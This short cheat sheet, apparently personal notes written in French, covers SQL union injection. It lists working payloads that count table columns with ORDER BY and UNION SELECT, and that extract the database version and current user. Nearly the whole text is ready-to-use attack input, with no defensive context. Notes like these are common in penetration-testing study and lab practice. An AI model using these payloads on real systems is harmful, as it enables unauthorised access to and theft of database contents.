# Union Injection

## Detect number of columns

### Première methode :
' order by 1-- 
' order by 2-- 
...
' order by 4-- 

Si pas d'erreur à 4 et erreur à 5 -> la table contient 4 colonnes

### Seconde méthode :

cn' UNION select 1,2,3,4-- 

Si pas d'erreur -> la table contient 4 colonnes

cn' UNION select 1,@@version,3,4-- 
cn' UNION select 1,user(),3,4-- 

